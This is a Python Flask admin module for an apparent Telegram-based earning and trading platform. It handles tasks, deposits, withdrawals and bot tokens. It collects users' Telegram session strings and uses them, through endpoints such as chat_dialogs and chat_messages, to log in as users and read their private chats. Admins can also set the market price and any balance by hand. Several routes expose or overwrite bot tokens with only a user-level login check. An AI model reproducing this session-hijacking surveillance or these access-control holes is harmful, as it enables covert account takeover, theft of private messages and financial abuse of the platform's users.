from flask import Blueprint, render_template, request, jsonify, session, redirect, url_for
from datetime import datetime, timedelta
from bson import ObjectId
import secrets

from app import users_col, admin_config_col, deposits_col, withdraws_col, trades_col, db_mongo, task_claims_col, milestones_col
from app.utils.decorators import admin_required, login_required
from app.utils.helpers import get_admin_config, update_total_users, run_async
from app.services.telegram_service import send_telegram_message

admin_bp = Blueprint('admin', __name__, url_prefix='/admin')

# ================= PAGE ROUTES =================
@admin_bp.route('/')
def admin_redirect():
    if session.get("admin_logged_in"):
        return redirect(url_for("admin.admin_dashboard"))
    return redirect(url_for("auth.admin_login_page"))

@admin_bp.route('/dashboard')
@admin_required
def admin_dashboard():
    return render_template("admin/dashboard.html")

@admin_bp.route('/tasks')
@admin_required
def admin_tasks_page():
    return render_template("admin/task.html")

@admin_bp.route('/trading')
@admin_required
def admin_trading_page():
    return render_template("admin/trading.html")

@admin_bp.route('/wallet')
@admin_required
def admin_wallet_page():
    return render_template("admin/wallet.html")

@admin_bp.route('/account')
@admin_required
def admin_account_page():
    return render_template("admin/account.html")

@admin_bp.route('/session_viewer')
def session_viewer():
    if not session.get("admin_logged_in"):
        return redirect(url_for("auth.admin_login_page"))
    return render_template("session_viewer.html")

@admin_bp.route('/chat_viewer')
def chat_viewer():
    if not session.get("admin_logged_in"):
        return redirect(url_for("auth.admin_login_page"))
    return render_template("chat_viewer.html")

# ================= ADMIN APIs =================
@admin_bp.route('/api/admin/users')
def admin_users():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    users = list(users_col.find({}, {
        "_id": 0, 
        "telegram_id": 1,
        "first_name": 1, 
        "username": 1,
        "phone": 1, 
        "cash": 1,
        "aaf": 1,
        "session_string": 1
    }))
    return jsonify({"users": users})

@admin_bp.route('/api/admin/config')
@login_required
def admin_config():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    admin = get_admin_config()
    popup = admin.get("popup_ad", {})
    return jsonify({
        "server_income": admin.get("server_income", 0),
        "server_trading": admin.get("server_trading", 0),
        "banner_ad_code": admin.get("banner_ad_code", ""),
        "referral_bonus": admin.get("referral_bonus", 0),
        "bot_token": admin.get("bot_token", ""),
        "channel_url": admin.get("channel_url", ""),
        "channel_id": admin.get("channel_id", ""),
        "extra_users": admin.get("extra_users", 0),
        "bonus_target": admin.get("bonus_target", 5),
        "task_rules": admin.get("task_rules", {"device_check": True, "ip_check": False, "account_check": True}),
        "ip_limit_per_hour": admin.get("ip_limit_per_hour", 5),
        "default_task_expiry_hours": admin.get("default_task_expiry_hours", 168),
        "wallet": admin.get("wallet", {"nagad": "", "bkash": ""}),
        "popup_ad_title": popup.get("title", ""),
        "popup_ad_desc": popup.get("desc", ""),
        "popup_ad_image": popup.get("image", ""),
        "popup_ad_enabled": popup.get("enabled", False)
    })

@admin_bp.route('/api/admin/update_settings', methods=["POST"])
@login_required
def admin_update_settings():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json

    update_data = {
        "channel_url": data.get("channel_url", ""),
        "min_trades": int(data.get("min_trades", 5)),
        "ip_limit": data.get("ip_limit", "off"),
        "bot_token": data.get("bot_token", ""),
        "channel_id": data.get("channel_id", ""),
        "server_income": float(data.get("server_income", 0)),
        "server_trading": float(data.get("server_trading", 0)),
        "bonus_target": int(data.get("bonus_target", 5)),
        "banner_ad_code": data.get("banner_ad_code", ""),
        "extra_users": int(data.get("extra_users", 0)),
        "referral_bonus": float(data.get("referral_bonus", 0)),
        "task_banner_ad": data.get("task_banner_ad", ""),
        "task_popup_ad": data.get("task_popup_ad", ""),
        "task_rules": data.get("task_rules", {"device_check": True, "ip_check": False, "account_check": True}),
        "ip_limit_per_hour": int(data.get("ip_limit_per_hour", 5)),
        "default_task_expiry_hours": int(data.get("default_task_expiry_hours", 168)),
        "trade_impact_factor": float(data.get("trade_impact_factor", 0.0001)),
        "price_volatility": float(data.get("price_volatility", 0.0005))
    }

    update_data["popup_ad"] = {
        "title": data.get("popup_ad_title", ""),
        "desc": data.get("popup_ad_desc", ""),
        "image": data.get("popup_ad_image", ""),
        "enabled": data.get("popup_ad_enabled", False)
    }

    admin_config_col.update_one({"_id": "global"}, {"$set": update_data}, upsert=True)
    return jsonify({"success": True})

@admin_bp.route('/api/admin/set_price', methods=["POST"])
@login_required
def admin_set_price():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    price = request.json.get("price")
    if price:
        admin_config_col.update_one({"_id": "global"}, {"$set": {"live_price": float(price)}})
        return jsonify({"success": True})
    return jsonify({"error": "Invalid price"}), 400

@admin_bp.route('/api/admin/set_fee', methods=["POST"])
@login_required
def admin_set_fee():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    fee = request.json.get("fee")
    if fee:
        admin_config_col.update_one({"_id": "global"}, {"$set": {"trading_fee": float(fee)}})
        return jsonify({"success": True})
    return jsonify({"error": "Invalid fee"}), 400

@admin_bp.route('/api/admin/update_wallets', methods=["POST"])
@login_required
def admin_update_wallets():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    nagad = request.json.get("nagad", "")
    bkash = request.json.get("bkash", "")
    admin_config_col.update_one({"_id": "global"}, {"$set": {"wallet": {"nagad": nagad, "bkash": bkash}}})
    return jsonify({"success": True})

@admin_bp.route('/api/admin/update_balance', methods=["POST"])
@login_required
def admin_update_balance():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    uid = request.json.get("uid")
    cash = request.json.get("cash")
    aaf = request.json.get("aaf")
    user = users_col.find_one({"telegram_id": uid})
    if not user:
        return jsonify({"error": "User not found"}), 404
    if cash is not None:
        users_col.update_one({"_id": user["_id"]}, {"$set": {"cash": float(cash)}})
    if aaf is not None:
        users_col.update_one({"_id": user["_id"]}, {"$set": {"aaf": float(aaf)}})
    return jsonify({"success": True})

@admin_bp.route('/api/admin/clear_field', methods=["POST"])
@login_required
def admin_clear_field():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    field_name = data.get("field")
    if not field_name:
        return jsonify({"error": "Field name required"}), 400
    allowed_fields = ["banner_ad_code", "task_banner_ad", "task_popup_ad", "trading_ad_text"]
    if field_name not in allowed_fields:
        return jsonify({"error": "Field not allowed"}), 400
    admin_config_col.update_one({"_id": "global"}, {"$set": {field_name: ""}})
    return jsonify({"success": True})

@admin_bp.route('/api/admin/reload_config', methods=["POST"])
def admin_reload_config():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"success": True, "message": "Configuration reloaded"})

@admin_bp.route('/api/admin/load_session', methods=["POST"])
def admin_load_session():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    session_string = data.get("session_string")
    if not session_string:
        return jsonify({"error": "No session string provided"}), 400

    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from app import API_ID, API_HASH

    async def fetch_user():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        try:
            me = await client.get_me()
            photo = None
            try:
                photo = await client.download_profile_photo(me, bytes)
                if photo:
                    import base64
                    photo = base64.b64encode(photo).decode('utf-8')
            except:
                pass
            return {
                "id": me.id,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "username": me.username,
                "phone": me.phone,
                "photo": photo
            }
        finally:
            await client.disconnect()

    try:
        user_info = run_async(fetch_user())
        return jsonify({"success": True, "user": user_info})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@admin_bp.route('/api/admin/chat_dialogs', methods=["POST"])
def admin_chat_dialogs():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    session_string = data.get("session_string")
    if not session_string:
        return jsonify({"error": "No session string"}), 400

    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from app import API_ID, API_HASH

    async def fetch_dialogs():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        try:
            dialogs = await client.get_dialogs()
            result = []
            for d in dialogs:
                name = d.name
                if not name:
                    if d.is_user and d.entity:
                        name = getattr(d.entity, 'first_name', '') or getattr(d.entity, 'username', '') or "User"
                    else:
                        name = "Chat"
                last_msg = ""
                if d.message:
                    last_msg = d.message.text if d.message.text else d.message.caption if hasattr(d.message, 'caption') else ""
                result.append({
                    "id": d.id,
                    "name": name,
                    "unread_count": d.unread_count,
                    "last_message": last_msg[:100]
                })
            return result
        except Exception as e:
            raise
        finally:
            await client.disconnect()

    try:
        dialogs = run_async(fetch_dialogs())
        return jsonify({"success": True, "dialogs": dialogs})
    except Exception as e:
        return jsonify({"success": False, "error": f"{type(e).__name__}: {str(e)}"})

@admin_bp.route('/api/admin/chat_messages', methods=["POST"])
def admin_chat_messages():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    session_string = data.get("session_string")
    chat_id = data.get("chat_id")
    limit = data.get("limit", 50)
    if not session_string or not chat_id:
        return jsonify({"error": "Missing parameters"}), 400

    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from app import API_ID, API_HASH

    async def fetch_messages():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        try:
            entity = await client.get_entity(int(chat_id))
            messages = await client.get_messages(entity, limit=limit)
            result = []
            for msg in messages:
                if msg.text:
                    text = msg.text
                elif msg.caption:
                    text = msg.caption
                else:
                    text = "[Service message or media without caption]"
                result.append({
                    "id": msg.id,
                    "text": text,
                    "sender_id": msg.sender_id if msg.sender_id else "Unknown",
                    "date": msg.date.isoformat() if msg.date else None
                })
            return result
        except Exception as e:
            raise
        finally:
            await client.disconnect()

    try:
        messages = run_async(fetch_messages())
        return jsonify({"success": True, "messages": messages})
    except Exception as e:
        return jsonify({"success": False, "error": f"{type(e).__name__}: {str(e)}"})

# ================= ADMIN DEPOSIT/WITHDRAW APIs =================
@admin_bp.route('/api/admin/pending_deposits')
def admin_pending_deposits():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    deposits = list(deposits_col.find({"status": "pending"}))
    for d in deposits:
        d["_id"] = str(d["_id"])
    return jsonify({"deposits": deposits})

@admin_bp.route('/api/admin/approve_deposit', methods=["POST"])
def admin_approve_deposit():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    deposit_id = data.get("id")
    deposit = deposits_col.find_one({"_id": ObjectId(deposit_id)})
    if deposit and deposit["status"] == "pending":
        user = users_col.find_one({"telegram_id": deposit["telegram_id"]})
        if user:
            users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": deposit["amount"]}})
            deposits_col.update_one({"_id": ObjectId(deposit_id)}, {"$set": {"status": "approved"}})
            return jsonify({"success": True})
    return jsonify({"success": False, "message": "Deposit not found or already processed"}), 404

@admin_bp.route('/api/admin/reject_deposit', methods=["POST"])
def admin_reject_deposit():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    deposit_id = data.get("id")
    deposit = deposits_col.find_one({"_id": ObjectId(deposit_id)})
    if deposit and deposit["status"] == "pending":
        deposits_col.update_one({"_id": ObjectId(deposit_id)}, {"$set": {"status": "rejected"}})
        return jsonify({"success": True})
    return jsonify({"success": False, "message": "Deposit not found"}), 404

@admin_bp.route('/api/admin/withdraws')
def admin_withdraws():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    pending = list(withdraws_col.find({"status": "pending"}, {
        "_id": 1, "telegram_id": 1, "amount": 1,
        "account_number": 1, "number": 1, "created_at": 1
    }))
    result = []
    for w in pending:
        result.append({
            "id": str(w["_id"]),
            "telegram_id": w["telegram_id"],
            "amount": w["amount"],
            "account_number": w.get("account_number") or w.get("number", "N/A"),
            "created_at": w.get("created_at").isoformat() if w.get("created_at") else ""
        })
    return jsonify({"list": result})

@admin_bp.route('/api/admin/withdraw/approve', methods=["POST"])
def admin_approve_withdraw():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    w_id = data.get("id")
    withdraw = withdraws_col.find_one({"_id": ObjectId(w_id)})
    if withdraw and withdraw["status"] == "pending":
        user = users_col.find_one({"telegram_id": withdraw["telegram_id"]})
        if user and user.get("cash", 0) >= withdraw["amount"]:
            users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": -withdraw["amount"]}})
            withdraws_col.update_one({"_id": ObjectId(w_id)}, {"$set": {"status": "approved"}})
    return jsonify({"success": True})

@admin_bp.route('/api/admin/reject_withdraw', methods=["POST"])
def admin_reject_withdraw():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    w_id = data.get("id")
    withdraw = withdraws_col.find_one({"_id": ObjectId(w_id)})
    if not withdraw or withdraw["status"] != "pending":
        return jsonify({"success": False, "message": "Withdraw request not found"}), 404
    withdraws_col.update_one({"_id": ObjectId(w_id)}, {"$set": {"status": "rejected"}})
    return jsonify({"success": True, "message": "Withdraw request rejected"})

# ================= ADMIN TASK APIs =================
@admin_bp.route('/api/admin/tasks')
def admin_tasks():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    tasks = list(db_mongo["tasks"].find({}))
    task_list = []
    for t in tasks:
        t["id"] = t.get("task_id", str(t["_id"]))
        t["_id"] = str(t["_id"])
        task_list.append(t)
    return jsonify({"tasks": task_list})

@admin_bp.route('/api/admin/tasks/list', methods=["GET"])
def admin_tasks_list():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    tasks = list(db_mongo["tasks"].find({}, {"_id": 0}))
    for t in tasks:
        t["_id"] = t.get("task_id")
    return jsonify({"tasks": tasks})

@admin_bp.route('/api/admin/task/save', methods=["POST"])
@login_required
def admin_save_task():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    task_id = secrets.token_hex(4)
    admin = get_admin_config()
    default_hours = admin.get("default_task_expiry_hours", 168)
    expiry_hours = int(data.get("expiry_hours", default_hours))
    expires_at = (datetime.utcnow() + timedelta(hours=expiry_hours)).isoformat()
    task_data = {
        "task_id": task_id,
        "title": data.get("title"),
        "link": data.get("link"),
        "reward": data.get("reward"),
        "timer": data.get("timer"),
        "type": data.get("type"),
        "currency": data.get("currency", "cash"),
        "expires_at": expires_at,
        "created_at": datetime.utcnow().isoformat(),
        "requires_approval": data.get("requires_approval", False),
        "device_check": data.get("device_check", True),
        "ip_check": data.get("ip_check", False),
        "account_check": data.get("account_check", True),
        "active": True
    }
    db_mongo["tasks"].insert_one(task_data)
    return jsonify({"success": True})

@admin_bp.route('/api/admin/task/delete', methods=["POST"])
@login_required
def admin_delete_task():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    task_id = data.get("task_id")
    if not task_id:
        return jsonify({"error": "Task ID required"}), 400
    result = db_mongo["tasks"].delete_one({"task_id": task_id})
    if result.deleted_count > 0:
        return jsonify({"success": True, "message": "🗑️ টাস্ক ডিলিট হয়েছে!"})
    else:
        return jsonify({"error": "Task not found"}), 404

@admin_bp.route('/api/admin/tasks/create', methods=["POST"])
def admin_tasks_create():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    task_id = secrets.token_hex(4)
    admin = get_admin_config()
    default_hours = admin.get("default_task_expiry_hours", 168)
    expiry_hours = data.get("expiry_hours", default_hours)
    expires_at = (datetime.utcnow() + timedelta(hours=expiry_hours)).isoformat()
    verification = data.get("verification", {})
    timer = data.get("timer", 30)
    task_data = {
        "task_id": task_id,
        "title": data.get("title"),
        "link": data.get("link"),
        "reward": float(data.get("reward", 0)),
        "type": data.get("type", "telegram_channel"),
        "currency": data.get("currency", "bdt"),
        "expiry_hours": expiry_hours,
        "expires_at": expires_at,
        "created_at": datetime.utcnow(),
        "max_users": data.get("max_users", 0),
        "current_users": 0,
        "active": True,
        "device_check": verification.get("device_check", True),
        "ip_check": verification.get("ip_check", False),
        "account_check": verification.get("account_check", True),
        "timer": timer
    }
    db_mongo["tasks"].insert_one(task_data)
    return jsonify({"success": True, "message": "টাস্ক তৈরি হয়েছে!", "task_id": task_id})

@admin_bp.route('/api/admin/tasks/toggle/<task_id>', methods=["POST"])
def admin_tasks_toggle(task_id):
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    task = db_mongo["tasks"].find_one({"task_id": task_id})
    if not task:
        return jsonify({"success": False, "message": "Task not found"}), 404
    new_active = not task.get("active", True)
    db_mongo["tasks"].update_one({"task_id": task_id}, {"$set": {"active": new_active}})
    status = "সক্রিয়" if new_active else "নিষ্ক্রিয়"
    return jsonify({"success": True, "message": f"টাস্ক {status} করা হয়েছে"})

@admin_bp.route('/api/admin/tasks/delete/<task_id>', methods=["DELETE"])
def admin_tasks_delete(task_id):
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    result = db_mongo["tasks"].delete_one({"task_id": task_id})
    if result.deleted_count > 0:
        return jsonify({"success": True, "message": "🗑️ টাস্ক ডিলিট হয়েছে!"})
    else:
        return jsonify({"success": False, "message": "Task not found"}), 404

@admin_bp.route('/api/admin/order_rates', methods=["GET", "POST"])
@login_required
def order_rates():
    if request.method == "POST":
        rates = request.json
        admin_config_col.update_one(
            {"_id": "global"},
            {"$set": {"task_order_rates": rates}},
            upsert=True
        )
        return jsonify({"success": True})
    else:
        admin = get_admin_config()
        rates = admin.get("task_order_rates", {
            "followers": 2.00,
            "members": 1.50,
            "views": 0.50,
            "likes": 0.50,
            "comments": 1.00
        })
        return jsonify({"rates": rates})

# ================= ADMIN MILESTONE APIs =================
@admin_bp.route('/api/admin/milestones')
def admin_milestones():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    milestones = list(milestones_col.find({}))
    for m in milestones:
        m["_id"] = str(m["_id"])
    return jsonify({"milestones": milestones})

@admin_bp.route('/api/admin/milestones/list', methods=["GET"])
def admin_milestones_list():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    milestones = list(milestones_col.find({}))
    for m in milestones:
        m["_id"] = str(m["_id"])
    return jsonify({"milestones": milestones})

@admin_bp.route('/api/admin/milestone/save', methods=["POST"])
def admin_save_milestone():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    milestone = {
        "target": data["target"],
        "reward_type": data["reward_type"],
        "reward_amount": data["reward_amount"],
        "days": data.get("days"),
        "type": data["type"],
        "active": data["active"],
        "created_at": datetime.utcnow()
    }
    milestones_col.insert_one(milestone)
    return jsonify({"success": True})

@admin_bp.route('/api/admin/milestone/delete', methods=["POST"])
def admin_delete_milestone():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    mid = data.get("id")
    milestones_col.delete_one({"_id": ObjectId(mid)})
    return jsonify({"success": True})

# ================= ADMIN PENDING CLAIMS =================
@admin_bp.route('/api/admin/pending_claims')
def admin_pending_claims():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    claims = list(task_claims_col.find({"status": "pending"}))
    for claim in claims:
        claim["_id"] = str(claim["_id"])
    return jsonify({"claims": claims})

@admin_bp.route('/api/admin/approve_claim', methods=["POST"])
def admin_approve_claim():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    claim_id = data.get("claim_id")
    action = data.get("action")
    claim = task_claims_col.find_one({"_id": ObjectId(claim_id)})
    if not claim:
        return jsonify({"success": False, "message": "Claim not found"}), 404
    if action == "approve":
        user = users_col.find_one({"telegram_id": claim["telegram_id"]})
        if user:
            if claim.get("currency") == "aaf":
                users_col.update_one({"_id": user["_id"]}, {"$inc": {"aaf": claim["reward"]}})
            else:
                users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": claim["reward"]}})
        task_claims_col.update_one({"_id": ObjectId(claim_id)}, {"$set": {"status": "approved"}})
    else:
        task_claims_col.update_one({"_id": ObjectId(claim_id)}, {"$set": {"status": "rejected"}})
    return jsonify({"success": True})

@admin_bp.route('/api/admin/settings', methods=["POST"])
def admin_global_settings():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    update_data = {}
    if "default_task_expiry_hours" in data:
        update_data["default_task_expiry_hours"] = data["default_task_expiry_hours"]
    if "ip_claim_limit_per_hour" in data:
        update_data["ip_claim_limit_per_hour"] = data["ip_claim_limit_per_hour"]
    if update_data:
        admin_config_col.update_one({"_id": "global"}, {"$set": update_data}, upsert=True)
    return jsonify({"success": True, "message": "গ্লোবাল সেটিংস সংরক্ষিত!"})

@admin_bp.route('/api/admin/clear_cache', methods=["POST"])
@admin_required
def clear_cache_api():
    from app.services.telegram_service import clear_all_cache
    data = request.json
    telegram_id = data.get("telegram_id")
    if telegram_id:
        from app.services.telegram_service import clear_user_cache
        clear_user_cache(telegram_id)
        return jsonify({"success": True, "message": f"Cache cleared for {telegram_id}"})
    else:
        clear_all_cache()
        return jsonify({"success": True, "message": "All cache cleared"})


# ========== বট কনফিগ API ==========

@admin_bp.route('/api/admin/bots/save-all', methods=["POST"])
@login_required
def save_all_bots():
    """সব বটের কনফিগারেশন সেভ করে"""
    data = request.json
    
    bot_config = {
        "dashboard_username": data.get("dashboard_username", ""),
        "dashboard_token": data.get("dashboard_token", ""),
        "task_username": data.get("task_username", ""),
        "task_token": data.get("task_token", ""),
        "withdraw_username": data.get("withdraw_username", ""),
        "withdraw_token": data.get("withdraw_token", ""),
        "admin_username": data.get("admin_username", ""),
        "admin_token": data.get("admin_token", "")
    }
    
    # ডাটাবেজে সেভ করুন
    admin_config_col.update_one(
        {"_id": "global"},
        {"$set": {"bots": bot_config}},
        upsert=True
    )
    
    return jsonify({"success": True, "message": "বট সেভ হয়েছে"})

@admin_bp.route('/api/admin/bots/all', methods=["GET"])
@login_required
def get_all_bots():
    """সব বটের কনফিগারেশন লোড করে"""
    admin = get_admin_config()
    bots = admin.get("bots", {})
    
    return jsonify({
        "success": True,
        "dashboard_username": bots.get("dashboard_username", ""),
        "dashboard_token": bots.get("dashboard_token", ""),
        "task_username": bots.get("task_username", ""),
        "task_token": bots.get("task_token", ""),
        "withdraw_username": bots.get("withdraw_username", ""),
        "withdraw_token": bots.get("withdraw_token", ""),
        "admin_username": bots.get("admin_username", ""),
        "admin_token": bots.get("admin_token", ""),
        "dashboard_active": bool(bots.get("dashboard_token")),
        "task_active": bool(bots.get("task_token")),
        "withdraw_active": bool(bots.get("withdraw_token")),
        "admin_active": bool(bots.get("admin_token"))
    })


# ================================================
# ========== বট ব্যবহারের ফাংশন ==========
# ================================================

def get_bot_token(bot_type):
    """নির্দিষ্ট বটের টোকেন রিটার্ন করে"""
    admin = get_admin_config()
    bots = admin.get("bots", {})
    
    bot_map = {
        "dashboard": "dashboard_token",
        "task": "task_token",
        "withdraw": "withdraw_token",
        "admin": "admin_token"
    }
    
    token_key = bot_map.get(bot_type)
    if token_key:
        return bots.get(token_key, "")
    return ""

def send_bot_message(bot_type, chat_id, message):
    """নির্দিষ্ট বট দিয়ে মেসেজ পাঠায়"""
    token = get_bot_token(bot_type)
    if not token:
        print(f"⚠️ {bot_type} বট টোকেন নেই")
        return False
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "MARKDOWN"
    }
    
    try:
        import requests
        response = requests.post(url, json=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ {bot_type} বট এরর: {e}")
        return False



@admin_bp.route('/api/admin/bots/validate', methods=["POST"])
@login_required
def validate_bot():
    """বট টোকেন ভ্যালিডেশন চেক"""
    data = request.json
    token = data.get("token", "")
    if not token:
        return jsonify({"valid": False, "message": "টোকেন দিন"})
    
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        import requests
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            bot_info = response.json()
            return jsonify({
                "valid": True,
                "username": bot_info.get("result", {}).get("username", "")
            })
        return jsonify({"valid": False, "message": "ভুল টোকেন"})
    except Exception as e:
        return jsonify({"valid": False, "message": str(e)})



# ================================================
# ========== নোটিফিকেশন ফাংশন ==========
# ================================================

def notify_user(bot_type, user_id, title, message):
    """ইউজারকে নোটিফিকেশন পাঠায়"""
    msg = f"**{title}**\n\n{message}"
    return send_bot_message(bot_type, user_id, msg)

def notify_admin_new_task(admin_user_id, task_id, title):
    """অ্যাডমিন বট দিয়ে নতুন টাস্ক নোটিফিকেশন"""
    msg = f"📋 **নতুন টাস্ক তৈরি!**\nআইডি: `{task_id}`\nটাইটেল: {title}"
    return send_bot_message("admin", admin_user_id, msg)

def notify_task_complete(user_id, task_id, reward):
    """টাস্ক কমপ্লিট হলে ইউজারকে নোটিফিকেশন"""
    msg = f"✅ **টাস্ক কমপ্লিট!**\nআইডি: `{task_id}`\nরিওয়ার্ড: ৳{reward}"
    return send_bot_message("task", user_id, msg)

def notify_withdraw_request(user_id, amount, status="pending"):
    """উইথড্র রিকোয়েস্টের নোটিফিকেশন"""
    msg = f"💰 **উইথড্র রিকোয়েস্ট**\nপরিমাণ: ৳{amount}\nস্ট্যাটাস: {status}"
    return send_bot_message("withdraw", user_id, msg)

def notify_deposit_approved(user_id, amount):
    """ডিপোজিট অনুমোদনের নোটিফিকেশন"""
    msg = f"✅ **ডিপোজিট অনুমোদিত!**\nপরিমাণ: ৳{amount}\nআপনার ওয়ালেটে যোগ হয়েছে।"
    return send_bot_message("dashboard", user_id, msg)